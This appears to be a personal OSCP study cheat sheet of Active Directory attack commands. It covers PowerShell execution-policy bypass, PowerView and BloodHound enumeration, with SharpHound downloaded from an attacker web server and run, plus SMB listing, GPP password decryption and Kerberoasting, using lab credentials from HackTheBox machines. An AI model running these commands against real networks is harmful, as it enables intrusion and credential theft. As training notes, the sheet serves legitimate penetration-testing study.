########################################################################################################
     _        _   _             ____  _               _                     ____           _        
    / \   ___| |_(_)_   _____  |  _ \(_)_ __ ___  ___| |_ ___  _ __ _   _  |  _ \ __ _ ___| |_ __ _ 
   / _ \ / __| __| \ \ / / _ \ | | | | | '__/ _ \/ __| __/ _ \| '__| | | | | |_) / _` / __| __/ _` |
  / ___ \ (__| |_| |\ V /  __/ | |_| | | | |  __/ (__| || (_) | |  | |_| | |  __/ (_| \__ \ || (_| |
 /_/   \_\___|\__|_| \_/ \___| |____/|_|_|  \___|\___|\__\___/|_|   \__, | |_|   \__,_|___/\__\__,_|
                                                                    |___/                           
########################################################################################################


# Looking for AD users, computers, key services, and vulnerable hosts and services
#


# For the sake of OSCP this is from an assumed breach perspective 

# Initial access (if possible)
xfreerdp /u:<USER> /d:<DOMAIN> /v:<IP>
evil-winrm -i <IP> -u <USER> -p <PASS>


{{{ 1. Initial Recon  

### PowerView ###
powershell -ep bypass
# or
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1

# gather a list of computers, users, and groups
get-netdomain
get-netuser | select cn,pwdlastset,lastlogon
get-netgroup | select cn
get-netgroup "domain admins" | select member
get-netcomputer | select operatingsystem,dnshostname

# check for local admin access with current user
Find-LocalAdminAccess
get-netsession -computername <HOSTNAME>
.\PsLoggedon.exe \\<HOSTNAME>    # requires remote registry enabled


### Spervice Principle Names ###
# services launched by system it is run in context of a Service Account
# Apps like Exchange, mssql, IIS, when integrated into AD a unique SPN associates a service to a specific service account in AD

# nativley list SPN linked to a certain account
setspn -L <USER>

# powerview enumeate all accounts in the domain
Get-NetUser -SPN | select samaccountname,serviceprincipalname



### Enumerate Object Permissions ###
Get-ObjectAcl -Identity <USER>

Convert-SidToName <SID>


# The highest access permission we can have on an object is GenericAll

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights














### Bloodhound ###
# bloodhound
cp /usr/share/sharphound/SharpHound.ps1 .
python -m http.server
invoke-webrequest -uri http://10.10.14.155:8000/SharpHound.ps1 -outfile sharphound.ps1
powershell -ep bypass
import-module .\sharphound.ps1
get-help invoke-bloodhound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Documents -OutputPrefix "htb.local-audit"

# analyze with bloodhound


}}}

{{{ ### SMB ###

# smbclient
smbclient -L //<IP>

smbclient //10.129.165.65/Users --user=active.htb/administrator


# smbmap
smbmap -H <IP> 


}}}

{{{ ### LDAP




}}}


# GPP Hash
policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups\Groups.xml

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

# Kerberoasting
# obtain password hash from a service principle name (SPN)
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request


